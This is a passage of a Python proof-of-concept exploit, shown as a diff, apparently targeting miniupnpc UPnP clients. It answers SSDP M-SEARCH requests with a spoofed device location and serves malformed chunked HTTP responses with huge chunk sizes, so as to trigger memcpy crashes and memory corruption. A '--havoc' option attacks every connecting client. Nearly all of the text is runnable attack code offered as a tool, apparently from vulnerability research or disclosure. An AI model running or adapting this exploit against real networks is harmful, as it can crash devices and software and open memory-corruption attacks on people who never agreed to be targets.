+            if SELECT_SCENARIO==SCENARIO_CRASH_LARGE_MEMCPY:
+                chunks = [(None, "<xml>BOOM</xml>"), (0x80000000, "A" * 9000), (None, "bye")]
+            elif SELECT_SCENARIO==SCENARIO_CRASH_1_BYTE_BUFFER:
+                chunks = [(None, "<xml>BOOM</xml>"), (0x80000000 - 1 + 15, "A" * 9000), (None, "bye")]
+            else:
+                chunks = [(None, "<xml>BOOM</xml>"), (0x80000000-1+15, "A" * 9000), (None, "bye")]
+        self.send(client, connection, chunks)
+
+
+def main():
+    #from optparse import OptionParser
+    import argparse
+    global SELECT_SCENARIO
+    SELECT_SCENARIO = SCENARIO_CRASH_LARGE_MEMCPY  # crash with a large memcpy
+    # SELECT_SCENARIO = SCENARIO_CRASH_REALLOC_NULLPTR  # crash with a memcpy to nullptr due to realloc error (miniupnpc v1.8)
+    # SELECT_SCENARIO = SCENARIO_CRASH_1_BYTE_BUFFER
+
+    logging.basicConfig(format='[%(filename)s - %(funcName)20s() ][%(levelname)8s] %(message)s',
+                        loglevel=logging.DEBUG)
+    logger.setLevel(logging.DEBUG)
+
+    usage = """poc.py [options]
+
+           example: poc.py --listen <your_local_ip>:65000 [--havoc | --target <ip> [<ip>..]]
+
+        """
+    #parser = OptionParser(usage=usage)
+    parser = argparse.ArgumentParser(usage=usage)
+    parser.add_argument("-q", "--quiet",
+                      action="store_false", dest="verbose", default=True,
+                      help="be quiet [default: False]")
+    parser.add_argument("-l", "--listen", dest="listen",
+                      help="local httpserver listen ip:port. Note: 0.0.0.0:<port> is not allowed. This ip is being used "
+                           "in the SSDP response Location header.")
+    parser.add_argument("-u", "--usn",
+                      dest="usn", default="uuid:deadface-dead-dead-dead-cafebabed00d::upnp:rootdevice",
+                      help="Unique Service Name. ")
+    parser.add_argument("-t", "--target", dest="target",
+                      default=[], nargs='*',
+                      help="Specify a list of client-ips to attack. Use --havoc to attempt to crash all clients.")
+    parser.add_argument("-z", "--havoc",
+                      action="store_true", dest="havoc", default=False,
+                      help="Attempt to attack all clients connecting to our http server. Use at your own risk.")
+
+    options= parser.parse_args()
+    if not options.verbose:
+        logger.setLevel(logging.INFO)
+    if not options.havoc and not options.target:
+        parser.error("No target specified. Use --havoc to attack all devices or --target <ip> to attack specific ips.")
+
+    if options.havoc:
+        options.target = None
+    if not options.listen :
+        parser.error("missing mandatory option --listen <ip>:<port>")
+    options.listen = options.listen.strip().split(":")
+    options.listen = (options.listen[0], int(options.listen[1]))
+    if "0.0.0.0" in options.listen[0]:
+        parser.error("0.0.0.0 not allowed for --listen")
+
+    logger.info("""
+
+
+   _  _    _____ _____ _____ _____
+  / |/ |  |  |  |  _  |   | |  _  |            ___ ___    _____ ___ ___ ___
+ / // /   |  |  |   __| | | |   __|   _ _ _   |   | . |  |     | . |  _| -_|
+|_/|_/    |_____|__|  |_|___|__|     |_|_|_|  |_|_|___|  |_|_|_|___|_| |___
+
+                                                      //github.com/tintinweb
+
+
+    [mode  ]      %s
+    [listen]      %s (local http server listening ip)
+    [usn   ]      %s
+    """%("⚡  havoc (targeting any incoming client)" if options.havoc else "   filter (targeting %r)"%options.target,
+         "%s:%d"%options.listen,
+         options.usn))
+
+    webserver = BadHttpServer(options.listen, options.target)
+    logger.debug("spawning webserver: %r" % webserver)
+    webserver.start()
+
+    def handle_msearch(upnp, msg, peer):
+        # logger.info("MSEARCH! - %r" % msg)
+        # build answer
+        # template = """NOTIFY * HTTP/1.1
+        template = """HTTP/1.1 200 OK
+USN:  <overridden>
+NTS:  ssdp:alive
+SERVER:  <overridden>
+HOST:  239.255.255.250:1900
+LOCATION:  <overridden>
+CACHE-CONTROL:  max-age=60
+NT:  upnp:rootdevice"""
+        ans = HttpLikeMessage(template)
+        ans.header["USN"] = options.usn + msg.header["ST"]
+        ans.header["SERVER"] = "UPnP Killer/%s" % __version__
+        ans.header["LOCATION"] = "http://%s:%d/xxxx.xml" % webserver.bind
+        ans.header["ST"] = msg.header["ST"]
+        ans.header["EXT"] = ""
+
+        logger.debug("[----->] sending answer: %s" % repr(ans))
+        # upnp.sock.sendto(str(ans), (upnp.group, upnp.port))
+        upnp.sock.sendto(str(ans), peer)
+
+    def handle_notify(upnp, msg, peer):
+        # logger.info("NOTIFY! %r" % msg)
+        pass
+
+    upnp = UPnPListener()
+    upnp.register_callback("M-SEARCH", handle_msearch)
+    upnp.register_callback("NOTIFY", handle_notify)
+    upnp.listen()
+    logger.info("--end--")
+
+
+if __name__ == "__main__":
+    main()
